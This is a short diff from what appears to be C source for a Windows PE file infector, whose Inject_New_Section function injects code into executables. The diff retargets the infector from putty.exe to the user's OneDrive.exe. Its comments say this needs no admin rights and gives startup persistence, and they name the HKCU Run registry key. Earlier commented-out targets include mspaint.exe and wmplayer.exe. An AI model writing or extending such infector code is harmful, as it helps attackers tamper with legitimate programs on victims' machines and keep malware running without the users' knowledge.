@@ -110,10 +110,11 @@ void Inject_New_Section(char* pe_file, size_t size_of_pe, char xcode[], size_t s
 
 int main(int argc, char *argv[])
 {
-	
-	//char fileToInfect[] = "C:\\Windows\\System32\\mspaint.exe";
-	char file_to_infect[] = "putty.exe";
-	char new_name[] = "putty_aleix_git.exe";
+	//register for user startup Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run or Run once
+	char file_to_infect[] = "C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"; //no need for admin, run at startup
+	//char file_to_infect[] = "C:\\Program Files (x86)\\Windows Media Player\\wmplayer.exe";
+	//char file_to_infect[] = "putty.exe";
+	char new_name[] = "C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive_a.exe";
 
 	//auto outfile = argv[2];
 	//auto infile = argv[1];
